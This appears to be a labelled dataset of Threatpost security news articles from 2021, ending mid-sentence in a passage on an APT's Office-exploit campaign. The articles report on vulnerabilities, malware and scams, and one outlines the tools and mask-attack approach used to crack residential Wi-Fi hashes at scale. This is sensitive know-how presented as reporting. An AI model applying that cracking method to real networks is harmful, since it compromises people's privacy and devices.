[
    {
        "title": "Parallels Offers ‘Inconvenient’ Fix for High-Severity Bug",
        "author": "Tom Spring",
        "date": "August 27, 2021 4:54 pm",
        "text": "Firm offers guidance on how to mitigate a five-months-old privilege escalation bug impacting Parallels Desktop 16 for Mac and all previous versions.\nThe makers of Parallels Desktop has released a workaround fix for a high-severity privilege escalation bug that impacts its Parallels Desktop 16 for Mac software and all older versions. Mitigation advice comes five months after researchers first identified the bug in April.\nParallels Desktop, now owned by private equity giant KKR, is used by seven million users, according to the company, and allows Mac users to run Windows, Linux and other operating systems on their macOS.\nThe vulnerability allows malicious software running in a Parallels virtual machine (VM) to access macOS files shared in a default configuration of the software. The software maker stated that the recommended fixes need to be manually performed by end users and will likely “inconvenience” some while also reducing product functionality.\nIn a Wednesday security bulletin, first to widely disclose details of the bug, it was revealed that the vulnerability (CVE-2021-34864) is caused by improper access control in the Parallels’ WinAppHelper component. The flaw, according to Parallels, is specifically tied to the software’s Parallels Tools, a proxy for communications between the host macOS and the virtual machine’s operating system.\nAn Easy-to-Exploit Bug\n“The issue results from the lack of proper access control. An attacker can leverage this vulnerability to escalate privileges and execute arbitrary code in the context of the hypervisor,” according to a separate security advisory, also posted Wednesday.\nThe severity of the vulnerability is rated as high (8.8) using the Common Vulnerability Scoring System, version 3.0. The bulletin also warns that the level of complexity needed to exploit the vulnerability is “low.”\n“By default, Parallels Desktop shares files and folders between the Mac and a VM, so users can easily open macOS files from applications running in a virtual machine and save documents to Mac,” Parallels explained. “This functionality exposes the user home folder to the VM. This folder may contain configuration files, cache from different applications, etc., that malicious software can access.”\nParallels is advising users to mitigate the vulnerability via reconfiguring their software or upgrading to the latest version, which is Parallels Desktop 17 for Mac, released on August 10.\n“Parallels Desktop 17 for Mac and newer versions are not affected. The entire home folder is no longer shared with a VM by default, only selected folders, like Desktop, Documents, Downloads, etc.,” according to the vulnerability’s summary description.\nThe company added, “This vulnerability allows local malicious users to escalate privileges on affected installations of Parallels Desktop. An attacker must first obtain the ability to execute low-privileged code on the target guest system in order to exploit this vulnerability.”\nDisclosure Timeline \nThe flaw was initially detected by security researchers Sunjoo Park and Jack Dates on April 8, during Trend Micro’s Pawn2Own Austin event. For their efforts, the researchers earned $40,000 each, according to the event’s organizer.\nOn August 10, Parallels posted to its Knowledge Base information regarding the flaw, under the title “Mitigate ZDI-CAN-13543 in Parallels Desktop 16 and older”. The post described the April discovery and mitigation steps users needed to take to protect themselves. On Wednesday, a number of security alerts posted the vulnerability’s identifying number (CVE-2021-34864), assigning it a high-severity rating.\nThe prospect of malicious software or a threat actor breaking or escaping a virtual instance of Windows to infect a system is a worst-case scenario. Parallels did not return requests for comment for this report.\nParallels: An Inconvenient Fix\nTo mitigate against the vulnerability, Parallels Desktop 16 for Mac users (and other legacy users) have a number of options. The first option is to upgrade to Parallels Desktop 17 for Mac, which does not contain the flaw. It’s unclear if affected customers will have to pay the $50 one-time upgrade fee for the Standard Edition to mitigate the flaw via an upgrade.\nFor customers running Parallels Desktop 16 users or earlier versions of the software, the company said the fixes available to them will “reduce functionality” of the software and cause “inconveniences,” such as file duplications when sharing documents across VM and the host macOS.\n“If you don’t plan to run untrusted code in the VM, it is recommended to follow common security practices,” the company recommended. “If you run untrusted code in the VM and you want to isolate the VM from Mac, then one of the following options can be used.”\nThose options, according Parallels, include:\nDisable shared folders as described in KB 6912. Shared Profile functionality will be disabled as well, and you will no longer be able to open Mac files in the VM or save files to Mac. Learn more in KB 6912.\nAlternatively, isolate the VM from Mac as described in KB 112942. After isolating, folders, files, applications, and external drives are not shared between two operating systems. In general, it becomes impossible for a VM to access any information on your Mac. Isolating a virtual machine provides the highest level of security.\nWhile the above mitigates security issue, it also eliminates one of Parallels selling points: “Seamlessly move and share content between Mac and Windows.”\nIt’s also unclear whether macOS users who configure their systems to isolate the VM guest from the host operating system mitigate the flaw.\nResearchers Turn to Parallels  \nWhile Parallels Desktop for Mac is not marketed as a cybersecurity research tool, a number of websites recommend this type of use scenario.\nParallels is just one of many virtual machine options for macOS users to run alternate operating systems. Others include Apple’s own Boot Camp feature, VirtualBox and VMWare for macOS.\nIncreased interest in Parallels has recently been sparked because in Apple’s new ARM-based Macs, which contain its security-forward M1 chip, Boot Camp has been removed. Installing Windows 10 on M1 Macs requires an ARM copy of Microsoft’s operating system.\nCraig Federighi, Apple’s senior vice president of software engineering, said Apple is not planning to support Boot Camp on ARM-based Macs in the future, during a Daring Fireball podcast.\nSeeing an opportunity, on April 14 Parallels released an update for Parallels Desktop 16 for Mac that supports Mac computers with Apple M1 chip.\nCheck out our free upcoming live webinar events – unique, dynamic discussions with cybersecurity experts and the Threatpost community:\nWrite a comment\nShare this article:\nCloud Security\nMalware\nVulnerabilities",
        "label": 1
    },
    {
        "title": "Adobe’s Surprise Security Bulletin Dominated by Critical Patches",
        "author": "Tara Seals",
        "date": "October 27, 2021 3:13 pm",
        "text": "Out of 92 security vulnerabilities, 66 are rated critical in severity, mostly allowing code execution. The most severe can lead to information disclosure.\nAdobe has dropped a mammoth out-of-band security update this week, addressing 92 vulnerabilities across 14 products.\nThe majority of the disclosed bugs are critical-severity problems, and most allow arbitrary code execution (ACE). Privilege escalation, denial-of-service and memory leaks/information disclosure are all well-represented, as well.\nAdobe After Effects, Animate, Audition, Bridge, Character Animator, Illustrator, InDesign, Lightroom Classic, Media Encoder, Photoshop, Prelude, Premiere Pro, Premiere Elements and the XMP Toolkit SDK all received patches.\nThere’s plenty of commonality across the advisories. For instance, the lion’s share of the bugs allow access to a memory location after the end of a buffer, leading to ACE (a type of memory issue that can be exploited, like a standard buffer overflow in the worst-case scenario).\nAlso, almost all of the critical problems rate 7.8 on the CVSS vulnerability severity scale, except for one type. The advisory lists “NULL pointer dereference bugs causing memory leak” flaws as the most severe issues in the bunch, all rating 8.3 on the CVSS scale. These pop up in Bridge, Media Encoder, Prelude and Premiere Elements (and are italicized, below).\nAdobe October Out-of-Band CVEs\nHere’s the full breakdown of the critical bugs:\nAfter Effects:\nCVE-2021-40751, CVE-2021-40752, CVE-2021-40753, CVE-2021-40754, CVE-2021-40755, CVE-2021-40757, CVE-2021-40758, CVE-2021-40759, CVE-2021-40760 (Access of Memory Location After End of Buffer/ACE)\nAnimate:\nCVE-2021-40733, CVE-2021-42266, CVE-2021-42267 (Access of Memory Location After End of Buffer/ACE)\nCVE-2021-42268 (NULL Pointer Dereference/ACE)\nCVE-2021-42269 (Use After Free/ACE)\nCVE-2021-42270, CVE-2021-42271, CVE-2021-42272, CVE-2021-42524 (Out-of-Bounds Write/ACE)\nAudition:\nCVE-2021-40734, CVE-2021-40735, CVE-2021-40736, CVE-2021-40738, CVE-2021-40739, CVE-2021-40740 (Access of Memory Location After End of Buffer/ACE)\nBridge:\nCVE-2021-40750 (NULL Pointer Dereference/memory leak)\nCVE-2021-42533 (Double Free/ACE)\nCVE-2021-42722, CVE-2021-42720, CVE-2021-42719 (Out-of-Bounds Read/ACE)\nCVE-2021-42728 (Buffer Overflow/ACE)\nCVE-2021-42724, CVE-2021-42729, CVE-2021-42730 (Access of Memory Location After End of Buffer/ACE)\nCharacter Animator:\nCVE-2021-40763, CVE-2021-40764, CVE-2021-40765 (Access of Memory Location After End of Buffer/ACE)\nIllustrator:\nCVE-2021-40718 (Out-of-Bounds Read/memory leak)\nCVE-2021-40746 (Out-of-Bounds Read/ACE)\nInDesign:\nCVE-2021-42732 (Access of Memory Location After End of Buffer/ACE)\nCVE-2021-42731 (Buffer Overflow/ACE)\nLightroom Classic:\nCVE-2021-40776 (Creation of Temporary File in Directory with Incorrect Permissions/privilege escalation)\nMedia Encoder:\nCVE-2021-40778 (NULL Pointer Dereference/memory leak)\nCVE-2021-40777, CVE-2021-40779, CVE-2021-40780 (Access of Memory Location After End of Buffer/ACE)\nPhotoshop:\nCVE-2021-42735 (Access of Memory Location After End of Buffer/ACE)\nCVE-2021-42736 (Buffer Overflow/ACE)\nPrelude:\nCVE-2021-40773 (NULL Pointer Dereference/memory leak)\nCVE-2021-42733 (Improper Input Validation/ACE)\nCVE -2021-40775, CVE-2021-42738, CVE-2021-42737, CVE-2021-40772, CVE-2021-40771 (Access of Memory Location After End of Buffer/ACE)\nPremiere Elements:\nCVE-2021-40785 (NULL Pointer Dereference/memory leak)\nCVE-2021-40786, CVE-2021-40787, CVE-2021-42526, CVE-2021-42527 (Access of Memory Location After End of Buffer/ACE)\nPremiere Pro:\nCVE-2021-40792, CVE-2021-40793, CVE-2021-40794 (Access of Memory Location After End of Buffer/ACE)\nXMP Toolkit SDK:\nCVE-2021-42529, CVE-2021-42530, CVE-2021-42531, CVE-2021-42532 (Stack-Based Buffer Overflow/ACE)\nThis bulletin was prompted by findings from two teams that deserve busy-beaver awards: Adobe variously credited researchers from TopSec Alpha Team and Trend Micro’s Zero-Day Initiative (ZDI) for most of the bugs, except for CVE-2021-40746 in Illustrator, credited to “Tmgr.” This could also explain some of the commonalities in the bulletins.\n“Of the patches released by Adobe, nine of these came through the ZDI program,” Dustin Childs of ZDI told Threatpost. “Most of these are simple file-parsing bugs, but there are a couple of critical-rated out-of-bounds (OOB) write bugs as well. For these, the vulnerability results from the lack of proper validation of user-supplied data, which can result in a write past the end of an allocated structure. An attacker can leverage these bugs to execute code in the context of the current process.”\nThe fixes come two weeks after Adobe released its normal monthly Patch Tuesday patches. A company spokesperson characterized the release as “planned” rather than an emergency response – and indeed, Adobe said in its advisories that there’s no evidence that any of the bugs are being exploited in the wild.\n“While we strive to release regularly scheduled updates on Patch Tuesday, occasionally these regularly scheduled security updates are released on non-Patch Tuesday dates,” a company spokesperson told the Register.\nOf note: The advisory for Bridge is listed as priority 2 for patching, which in Adobe parlance means that the product has historically been at elevated risk for exploitation, so it comes with a recommendation that administrators patch within 30 days. The other advisories are priority 3, which is the lowest risk level, meaning that administrators can patch “at their discretion.”\nCheck out our free upcoming live and on-demand online town halls – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nVulnerabilities",
        "label": 1
    },
    {
        "title": "War-Driving Technique Allows Wi-Fi Password-Cracking at Scale",
        "author": "Tara Seals",
        "date": "October 27, 2021 1:00 pm",
        "text": "A researcher was able to crack 70 percent of the gathered hashes in an experiment in a residential neighborhood.\nWar-driving – the process of driving around mapping residential Wi-Fi networks in hopes of finding a vulnerability to exploit – can still pay off for attackers, apparently: A CyberArk researcher recently found he could easily slice open about 70 percent of Wi-Fi network passwords in one Tel Aviv community, all at once.\nCyberArk’s Ido Hoorvitch ran the experiment after observing that across multiple apartment moves, his neighbors’ mobile numbers turned out to also be their Wi-Fi passwords. He knew this because he asked to piggyback on the neighbors’ Wi-Fi while waiting for cable to be installed.\nFrom there, “I hypothesized that most people living in Israel (and globally) have unsafe Wi-Fi passwords that can be easily cracked or even guessed by curious neighbors or malicious actors,” he noted in a Tuesday blog. Well, it turns out he was right.\nWalking, Sniffing & Cracking in Tel Aviv\nTo carry out the experiment, Hoorvitch gathered 5,000 Wi-Fi network hashes by strolling the streets in Tel Aviv with readily available, commercial Wi-Fi sniffing equipment.\nHis hash-sniffing rig consisted of a $50 AWUS036ACH ALFA wireless network interface card (NIC) installed in a cheap Ubuntu machine and the Hcxdumptool utility from ZerBea. Hcxdumptool, available on GitHub, is used to capture packets from WLAN devices. The NIC has monitor-mode capabilities, which allows packet capturing without having to associate with an access point, the researcher explained.\nAfter gathering what he felt was a decent sample size of 5,000 SSIDs and password hashes, it was then time to get crackin’ – literally.\n“Our first step in the cracking procedure is to install Hashcat, the world’s fastest and most advanced password-recovery tool,” he said, which includes several password-cracking methods like mask and dictionary attacks.\nAfter he converted the sniffing results into a hashfile format compatible with Hashcat, he ran them through a mask attack, which is a process of trying all possible combinations from a set of characters. Mask attacks are more specific than, say, brute-force attacks, because the list of characters in the set is reduced based on information an attacker knows.\nIn this case, the Hashcat command tried all of the possible cellphone number combinations in Israel against each hash.\n“We chose to start with what’s called a mask attack, due to the terrible habit many people living in Israel have of using their cellphone numbers as Wi-Fi passwords,” he said, adding that this approach becomes easier because the Israeli cellphone prefix is always the same: 05.\n“[Numbers] are 10 digits long and it starts with 05,” Hoorvitch explained. “Therefore, we need to guess the remaining eight digits. Each digit has 10 options (0-9), hence 10**8 possible combinations.”\nThat translates into millions of combinations, but his laptop was able to cycle through 194,000 hashes per second. Upon the first run of the mask, he was able to crack 2,200 passwords.\nThe next step was mounting a standard dictionary attack, in which a set of common passwords is tried against a given account.\n“With the most common dictionary, Rockyou.txt, [we] cracked more than 900 hashes,” said Hoorvitch, bringing the total to around 3,500 cracked passwords, or 70 percent of the hashes he had gathered.\nRoaming Insecurity\nWhile the obvious moral of the story is that most people use dumb passwords, the other part of the narrative is the fact that Hoorvitch used a relatively new sniffing technique that only works with routers that support roaming features (which he details in his post).\nRoaming routers are usually deployed in city- or campus-mesh type situations where Wi-Fi is deployed as a blanket of internet access using multiple access points (APs). They use something called PMKID keys, which are unique key identifiers used to keep track of the password hash being used for the client as a person moves from router to router, to ensure continuous connectivity.\nMany routers have dual-purpose capabilities so that roaming options often show up in APs in residential settings even though their owners don’t need the functionality.\n“Not all routers support roaming features and are, therefore, not vulnerable to the PMKID attack,” Hoorvitch said. “However, our research found that routers manufactured by many of the world’s largest vendors are vulnerable.”\nThus, turning off roaming (if possible) is a good mitigation to war-driving. Otherwise, previous sniffing techniques required an attacker to be able to intercept the four-way handshake that happens when someone connects an AP – which prevents any cracking at scale.\n“As I estimated beforehand, the process of sniffing Wi-Fis and the subsequent cracking procedures was a very accessible undertaking in terms of equipment, costs and execution,” the researcher noted. “The bottom line is that in a couple of hours and with approximately $50, your neighbor or a malicious actor can compromise your privacy and much more if you don’t have a strong password.”\nHow to Protect Against Wi-Fi Cyberattacks\nExploitation stakes can be high when it comes to routers: Hoorvitch pointed out that breaking into a residential network allows attackers to pivot to any of its connected devices to steal information or drop malware. With people working from home since the pandemic, this could also have big consequences for business data protection.\n“For the small business, the risk lies in an attacker infiltrating a network and then moving laterally to high-value applications or data, such as a billing system or cashier,” according to the analysis. “Concerning the enterprise, it’s possible for an attacker to gain initial access to a remote user’s Wi-Fi and then hop to the user’s computer and wait for a VPN connection or for the user to go to the office and move laterally from there.”\nTo protect themselves, users should of course replace any default usernames and passwords, and choose complex passwords. They should also disable weak encryption protocols (such as WAP or WAP1) and disable WPS, the researcher advised.\nCheck out our free upcoming live and on-demand online town halls – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nMobile Security\nVulnerabilities\nWeb Security",
        "label": 1
    },
    {
        "title": "SolarWinds Attackers Hit Active Directory Servers with FoggyWeb Backdoor",
        "author": "Elizabeth Montalbano",
        "date": "September 28, 2021 10:39 am",
        "text": "Microsoft is warning that the Nobelium APT is compromising single-sign-on servers to install a post-exploitation backdoor that steals data and maintains network persistence.\nThe threat actors behind the notorious SolarWinds supply-chain attacks have dispatched new malware to steal data and maintain persistence on victims’ networks, researchers have found.\nResearchers from the Microsoft Threat Intelligence Center (MSTIC) have observed the APT it calls Nobelium using a post-exploitation backdoor dubbed FoggyWeb, to attack Active Directory Federation Services (AD FS) servers. AD FS enables single sign-on (SSO) across cloud-based apps in a Microsoft environment, by sharing digital identity and entitlements rights.\nThe attacks started as far back as April, Ramin Nafisi from MSTIC wrote in a blog post published Monday.\nNobelium is employing “multiple tactics to pursue credential theft” to gain admin privileges to AD FS servers, Nafisi wrote. Then, once a server is compromised, the threat group deploys FoggyWeb “to remotely exfiltrate the configuration database of compromised AD FS servers, decrypted token-signing certificates and token-decryption certificates,” he said, which can be used to penetrate into users’ cloud accounts.\nIn addition to remotely exfiltrating sensitive data, FoggyWeb also achieves persistence and communicates with a a command-and-control (C2) server to receive additional malicious components and execute them, Nafisi added.\nBackdoor Breakdown\nNafisi provides a thorough breakdown of the sophisticated FoggyWeb backdoor, which operates by allowing abuse of the Security Assertion Markup Language (SAML) token in AD FS, he explained in the post.\n“The backdoor configures HTTP listeners for actor-defined URIs that mimic the structure of the legitimate URIs used by the target’s AD FS deployment,” Nafisi wrote. “The custom listeners passively monitor all incoming HTTP GET and POST requests sent to the AD FS server from the intranet/internet and intercept HTTP requests that match the custom URI patterns defined by the actor.”\nAttackers store the malware in an encrypted file called Windows.Data.TimeZones.zh-PH.pri, while the malicious file version.dll acts as a loader. The DLL file leverages the CLR hosting interfaces and APIs to load FoggyWeb, a managed DLL, in the same Application Domain within which legitimate AD FS managed code is executed.\nIn this way, FoggyWeb gains access to the AD FS codebase and resources, including the AD FS configuration database. The malware also inherits AD FS service account permissions that are required to access the AD FS configuration database, Nafisis wrote.\nAdditionally, “because FoggyWeb is loaded into the same application domain as the AD FS managed code, it gains programmatical access to the legitimate AD FS classes, methods, properties, fields, objects and components that are subsequently leveraged by FoggyWeb to facilitate its malicious operations,” he added.\nMoreover, FoggyWeb is also AD FS version-agnostic, which means it doesn’t need to keep track of legacy versus modern configuration table names and schemas, named pipe names and other version-dependent properties of AD FS, Nafisi wrote.\nMalware Mitigation\nMicrosoft has notified all customers observed being targeted or compromised by FoggyWeb, as well as included a comprehensive list of compromise indicators in the post.\nThe company also has recommended several mitigation actions for organizations, including: Auditing of on-premises and cloud infrastructure to identify any changes the actor might have made to maintain access; removing user and app access, reviewing configurations for each, and re-issuing new, strong credentials; and using a hardware security module to prevent the exfiltration of sensitive data.\nMicrosoft also is advising that all customers review their AD FS Server configuration and implement whatever changes are needed to secure the systems from attacks.\nTracking a Known Threat Actor\nMicrosoft researchers have been keeping a wary eye on Nobelium since the company got caught up in the SolarWinds attack that was first discovered late last year. They’ve been tracking the threat group’s activity and capabilities, which have expanded as the actors have built and deployed new malware.\nSince the SolarWinds incident, researchers have observed Nobelium steadily building out its arsenal beyond the Sunburst/Solorigate backdoor and Teardrop malware it initially deployed in that attack, which reached tens of thousands of organizations around the globe (though fewer than 100 were selected by the attackers for actual breach and compromise).\nThe group used malware called Raindrop in those follow-on SolarWinds attacks, then later added GoldMax, GoldFinder and Sibot malware for layered persistence to its toolset.\nMicrosoft researchers also identified EnvyScout, BoomBox, NativeZone and VaporRage as four pieces of malware that were used in a Nobelium email-based attack chain earlier this year.\nRule #1 of Linux Security: No cybersecurity solution is viable if you don’t have the basics down. JOIN Threatpost and Linux security pros at Uptycs for a LIVE roundtable on the 4 Golden Rules of Linux Security. Your top takeaway will be a Linux roadmap to getting the basics right! REGISTER NOW and join the LIVE event on Sept. 29 at Noon EST. Joining Threatpost is Uptycs’ Ben Montour and Rishi Kant who will spell out Linux security best practices and take your most pressing questions in real time.\n  Write a comment\nShare this article:\nMalware",
        "label": 1
    },
    {
        "title": "Teen Rakes in $2.74M Worth of Bitcoin in Phishing Scam",
        "author": "Becky Bracken",
        "date": "October 27, 2021 4:17 pm",
        "text": "The kid was busted after abusing Google Ads to lure users to his fake gift card site. \nDuring the early days of the pandemic, while the rest of the world was stress streaming and working on sourdough starter, an ambitious teen stuck in his bedroom decided to set up a fake “Love2Shop” gift card site to harvest people’s payment information, invest the stolen money in cryptocurrency and become a millionaire.\nThe intrepid 17-year-old in the U.K. collected just under $9,000 before the real Love2Shop caught on when customers started to complain, according to a local report from Lincolnshire Live. The boy’s name is being withheld because he’s a juvenile.\nHis age certainly didn’t prohibit the scammer from being allowed to purchase Google ads to help lure people to his phishing scam site, according to prosecutors, ultimately ranking the scam phishing site over the legitimate one.\nIn all, law enforcement said they found 12,000 credit card numbers and 197 PayPal accounts on his computer. They added that he had collected more than $440,000 in stolen money.\n“He had received through his PayPal accounts between January and March 2020 a total of £323,000,” the case’s prosecutor, Sam Skinner, said, according to Lincolnshire Live. “These sums came into his account and were transferred into cryptocurrency.”\nGrift Cash Invested in Crypto\nTurns out not only did the teen set up a lucrative criminal enterprise, but he’s also a wicked investor. His cryptocurrency investments were enormously profitable, ultimately climbing to more than $2.5 million.\n“The police found a large quantity of cryptocurrency,” Skinner added, “There were 48 Bitcoins and a smaller number of other coins. At the time they were worth £200,000. They are now worth a little over £2 million.”\nThe teen was sentenced to a year in youth rehabilitation for fraud and money laundering. His Bitcoin was also confiscated.\nCybersecurity Fundamentals\nA bored kid being able to pull off a heist of this size is a symptom of the wider cybersecurity community’s lack of fidelity to fundamentals, according to John Bambenek, principal threat hunter with Netenrich.\n“Ultimately, 40 years on with Internet-connected technologies and we still can’t resolve two basic problems: How can consumers verify that the websites they visit are legitimate? And, How can financial institutions validate transactions are legitimate?” Bambenek told Threatpost. “We’re failing so profoundly at the very basics that children can literally become millionaire criminals.”\nAnd the blame so often placed on users for falling victims to cybercrime hasn’t helped anyone but the attackers, as pointed out to Threatpost by Archie Agarwal, CEO of ThreatModeler. He added that companies with massive platforms like Google and PayPal have a responsibility to protect their platforms from being abused.\nSecuring Massive Platforms from Abuse\n“With the prevalence of open-source tools that scrape and rebuild replica existing websites in minutes, this type of crime is very hard to prevent,” Agarwal wrote. “And we must not make the mistake of blaming the victims for clicking links on a system built on clicking links. It is the duty of the security community and the large Internet companies such as Google and PayPal, who were used in this scam, to find ways for alarms to trip to protect users as fast as possible.”\nThreatpost asked Google directly about the U.K. teen’s ability to use Google’s advertising platform for criminal gain, and a spokesperson provided this response:\n“Our goal is to create a safe and trustworthy experience for users. We take matters of ad fraud very seriously and continue to vigorously enforce our policies and be nimble when faced with new threats.”\nGoogle’s current ad policies prohibit brand impersonation, replicating original content and various other forms of misrepresentation scammers use to abuse Google’s platform.\nWhen last March’s Ads Safety Report was released, Google vice president Scott Spencer acknowledged that the pandemic and disinformation campaigns aimed at elections around the world have presented the company with a complicated set of challenges over the past year; but pledged to continue to invest in cybersecurity at scale.\nSpencer explained that it’s just smart business: “Preserving trust for advertisers and publishers helps their businesses succeed in the long term,” he wrote. “In the upcoming year, we will continue to invest in policies, our team of experts and enforcement technology to stay ahead of potential threats.”\nCheck out our free upcoming live and on-demand online town halls – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nHacks\nWeb Security",
        "label": 0
    },
    {
        "title": "Threat Actors Abuse Discord to Push Malware",
        "author": "Elizabeth Montalbano",
        "date": "October 22, 2021 7:44 am",
        "text": "The platform’s Content Delivery Network and core features are being used to send malicious files—including RATs–across its network of 150 million users, putting corporate workplaces at risk.\nThreat actors are abusing the core features of the popular Discord digital communication platform to persistently deliver various types of malware—in particular remote access trojans (RATs) that can take over systems–putting its 150 million users at risk, researchers have found.\nRiskIQ and CheckPoint both discovered multi-functional malware being sent in messages across the platform, which allows users to organize Discord servers into topic-based channels in which they can share text, image or voice files or other executables. Those files are then stored on Discord’s Content Delivery Network (CDN) servers.\nResearchers warn, “many files sent across the Discord platform are malicious, pointing to a significant amount of abuse of its self-hosted CDN by actors by creating channels with the sole purpose of delivering these malicious files,” according to a report published Thursday by Team RiskIQ.\nInitially Discord attracted gamers, but the platform is now being used by organizations for workplace communication. The storage of malicious files on Discord’s CDN and proliferation of malware on the platform mean that “many organizations could be allowing this bad traffic onto their network,” RiskIQ researchers wrote.\nRATs and Miscellaneous Malware\nFeatures of the latest malware found on the platform include the capability to take screenshots, download and execute additional files, and perform keylogging, CheckPoint researchers Idan Shechter and Omer Ventura disclosed in a separate report also published Thursday.\nCheckPoint also found that the Discord Bot API—a simple Python implementation that eases modifications and shortens the development process of bots on the platform–“can easily turn the bot into a simple RAT” that threat actors can use “to gain full access and remote control on a user’s system.”\nDiscord bots are becoming an increasingly integral part of how users interact with Discord, allowing them to integrate code for enhanced features to facilitate community management, researchers said.\n“Discord bots appear to be powerful, friendly and highly time-saving,” Shechter and Ventura wrote. “However, with great power also comes great responsibility, and Discord’s bot framework can be easily used for malicious intent.”\nCheckPoint researchers discovered several malicious repositories among GitHub that are relevant for the Discord platform. These repositories include malware based on Discord API and malicious bots with different functionalities, they said.\nExploiting Discord Channels\nMeanwhile, RiskIQ researchers examined Discord CDN URLs containing .exe, DLL and various document and compressed files, discovering upon review of the hashes on VirusTotal that more than 100 were delivering malicious content. Eighty files were from 17 malware different families, with trojans comprising the most common malware observed on the platform, researchers said.\nSpecifically, RiskIQ researchers took a deeper dive into how Discord CDN uses a Discord domain through links that use [hxxps://cdn.discordapp[.]com/attachments/{ChannelID}/{AttachmentID}/{filename}] as the format to discover malware, they said.\nResearchers detected links and queried Discord channel IDs used in these links, which enabled them to identify domains containing web pages that link out to a Discord CDN link with a specific channel ID, they said.\n“For example, the RiskIQ platform can query the channel IDs associated with zoom[-]download[.]ml,” researchers explained. “This domain attempts to spoof users into downloading a Zoom plug-in for Microsoft Outlook and instead delivers the Dcstl password stealer hosted on Discord’s CDN.”\nIn another example, RiskIQ discovered that the channel ID for a URL containing a Raccoon password stealer file returned a domain for Taplink, a site that provides users with micro landing pages to direct individuals to their Instagram and other social media pages, they explained.\n“A user likely added the Discord CDN link to their Taplink page,” researchers explained. “Querying these IDs enables RiskIQ users to understand which Discord files and associated infrastructure are concerning and where they are across the web.”\nThe technique enabled researchers to determine the date and time Discord channels were created, linking ones created within a few days before the first observation of a file in VirusTotal to channels with the sole purpose of distributing malware, they said. Ultimately, they uncovered and cataloged 27 unique malware types hosted on Discord’s CDN.\nSecurity Holes Persist\nThe latest research isn’t the first time Discord has been called out for a malware problem. In July researchers from Sophos revealed that the number of Discord malware detections rose sharply compared to last year, also observing abuse of the CDN to host malicious files. Researchers also said at the time that Discord’s API was being leveraged to exfiltrate stolen data and facilitate hacker command-and-control channels.\nThe findings unsurprisingly raised an alarm among security experts, who said they demonstrate numerous holes with platforms that people widely use to communicate and share files that rely on the use of encrypted traffic for security.\nHowever, as has been observed many times before, encrypting traffic on APIs alone is not sufficient to keep malware off a content delivery network, noted one security professional.\n“API abuse is best defended by ensuring that only genuine software clients can use the API, thus preventing malicious scripts and malware doing damage to the platform, David Stewart, CEO of security firm Approov, said in an email to Threatpost.\nThe discovery also highlights a key problem in the development of communication platforms—the emphasis on functionality rather than security, said another security professional.\n“This is an example of an exploitation that probably could have been addressed with a better software design,” Saryu Nayyar, CEO of security firm Gurucul, said in an email to Threatpost.\nThat said, Discord’s developers need to think about adding a way to collect and analyze data in real time from the platform to discover and quickly remediate unusual activity, she said.\n“Absent a redesign of the Discord software, this is the only realistic way of detecting malware is to look for activities that are out of the ordinary,” Nayyar observed.\nWrite a comment\nShare this article:\nMalware",
        "label": 0
    },
    {
        "title": "Geriatric Microsoft Bug Exploited by APT Using Commodity RATs",
        "author": "Elizabeth Montalbano",
        "date": "October 20, 2021 9:28 am",
        "text": "Disguised as an IT firm, the APT is hitting targets in Afghanistan & India, exploiting a 20-year-old+ Microsoft Office bug that’s as potent as it is ancient.\nAn APT described as a “lone wolf” is exploiting a decades-old Microsoft Office flaw to deliver a barrage of commodity RATs to organizations in India and Afghanistan, researchers have found.\nAttackers use political and government-themed malicious domains as lures in the campaign, which targets mobile devices with out-of-the-box RATs such as dcRAT and QuasarRAT for Windows and AndroidRAT. They’re delivering the RATs in malicious documents by exploiting CVE-2017-11882, according to a report published Tuesday by Cisco Talos.\nThe threat group – tracked by Cisco Talos from the beginning of the year through the summer – disguises itself behind a front that seems legitimate, posing as a Pakistani IT firm called Bunse Technologies, researchers said.\nCVE-2017-11882 is a more than 20-year-old memory corruption vulnerability in Microsoft Office that persisted for 17 years before the company patched it in 2017. However, as recently as two years ago, attackers were seen exploiting the bug, which allows them to run malicious code automatically without requiring user interaction.\nThe advanced persistent threat (APT) behind the campaign also uses a custom file enumerator and infector in the reconnaissance phase of the two-step attack, followed by a second phase added in later versions of the campaign that deploys the ultimate RAT payload, researchers said.\nTo host the malware payloads, the threat actor registered multiple domains with political and government themes used to fool victims, particularly ones linked to diplomatic and humanitarian efforts in Afghanistan to target entities in that country, researchers said.\n“This campaign is a classic example of an individual threat actor employing political, humanitarian and diplomatic themes in a campaign to deliver commodity malware to victims” – in this case, RATs “packed with multiple functionalities to achieve complete control over the victim’s endpoint,” Cisco Talos’ Asheer Malhotra wrote in the post.\nOut-of-the-Box Benefits\nThe campaign reflects an increased trend by both cybercriminals and APTs to use commodity RATs instead of custom malware against victims for a number of reasons, researchers said.\nUsing commodity RATs gives attackers a range of out-of-the-box functionality, including preliminary reconnaissance capabilities, arbitrary command execution and data exfiltration, researchers noted. The RATs also “act as excellent launch pads for deploying additional malware against their victims,” Malhotra wrote.\nUsing commodity malware also saves attackers both the time and resource investment in developing custom malware, as the RATs have stock features requiring minimal configuration changes, researchers said.\nIn their post, researchers broke down the two-stage attack process as well as the specifics of each RAT they observed attackers using in the campaign. RAT functionality varies depending on the payload, they said, but generally includes capabilities such as remote shells, process management, file management, keylogging, arbitrary command execution and credential stealing.\nInitial Infection and Reconnaissance\nThe infection chain consists of a reconnaissance phase that starts with malicious RTF documents and PowerShell scripts that ultimately distribute malware to victims.\nSpecifically, the threat actor uses the RTF to exploit the Office bug and execute a malicious PowerShell command that extracts and executes the next-stage PowerShell script. That script then base64 decodes another payload – in the case researchers observed, it was a loader executable – and activates it on the infected endpoint, Malhotra wrote.\nThe loader executable begins by establishing persistence for itself using a shortcut in the current user’s Startup directory and then compiles hardcoded C# code into an executable assembly. It then invokes the entry point for the compiled malicious code – the previously mentioned custom file enumerator and infector – researchers found.\nThis C# code – which is the final payload in the reconnaissance phase – contains the file enumerator, which lists specific file types on the endpoint and sends the file paths to the command-and-control (C2) server along with file infector modules, which are different than typical executable infectors usually seen in the wild, Malhotra noted.\n“These modules are used for infecting benign Office documents with malicious OLE objects to weaponize them to exploit CVE-2017-11882,” he wrote.\nAttack Phase\nResearchers observed attackers switching up tactics to deploy commodity RATs as the final payload starting in July, they said.\nTo do this, attackers tweaked the reconnaissance process slightly to leverage the second-stage PowerShell script to create a BAT file on disk, researchers said. That file, in turn, would execute another PowerShell command to download and activate the RAT payload on the infected endpoint, retrieving it from one of the 